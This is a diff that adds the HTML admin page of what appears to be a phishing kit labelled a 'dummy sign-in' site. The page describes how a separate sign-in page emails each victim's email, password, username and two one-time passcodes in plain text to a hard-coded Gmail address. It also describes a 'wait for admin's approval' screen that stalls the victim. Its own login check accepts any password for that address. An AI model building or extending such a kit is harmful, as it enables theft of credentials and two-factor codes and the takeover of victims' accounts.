@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Admin Portal - Dummy Sign-In</title>
+</head>
+<body>
+
+  <h1>Admin Portal</h1>
+
+  <div id="login">
+    <h2>Admin Login</h2>
+    <form id="adminForm">
+      <label>Email: <input type="email" id="adminEmail" value="blessedresult6@gmail.com" required></label><br><br>
+      <label>Password: <input type="password" id="adminPassword" required></label><br><br>
+      <button type="submit">Login</button>
+    </form>
+    <p id="loginStatus"></p>
+  </div>
+
+  <div id="dashboard" style="display:none;">
+    <h2>Admin Dashboard</h2>
+    <p>You are logged in as: <strong>blessedresult6@gmail.com</strong></p>
+    <hr>
+    <p><strong>How this works:</strong></p>
+    <p>Whenever a dummy user goes through the sign-in steps on the main page, each piece of information is sent to this email address in plain text almost immediately.</p>
+    <ul>
+      <li>Email + Password</li>
+      <li>Username</li>
+      <li>OTP 1</li>
+      <li>OTP 2</li>
+    </ul>
+    <p>Check the inbox of <strong>blessedresult6@gmail.com</strong> for the latest submissions (subject starts with "Dummy Sign-In - ...").</p>
+    <p>There is no real-time list here because this is a static dummy site with no backend. All data arrives only by email.</p>
+    <br>
+    <p>After the user finishes OTP 2 they see a waiting page saying "Please wait for admin’s approval".</p>
+  </div>
+
+  <script>
+    document.getElementById('adminForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('adminEmail').value;
+      const password = document.getElementById('adminPassword').value;
+
+      // Dummy check - accept any password for the correct email
+      if (email.toLowerCase() === "blessedresult6@gmail.com") {
+        document.getElementById('login').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+      } else {
+        document.getElementById('loginStatus').textContent = "Wrong admin email.";
+      }
+    });
+  </script>
+
+</body>
+</html>
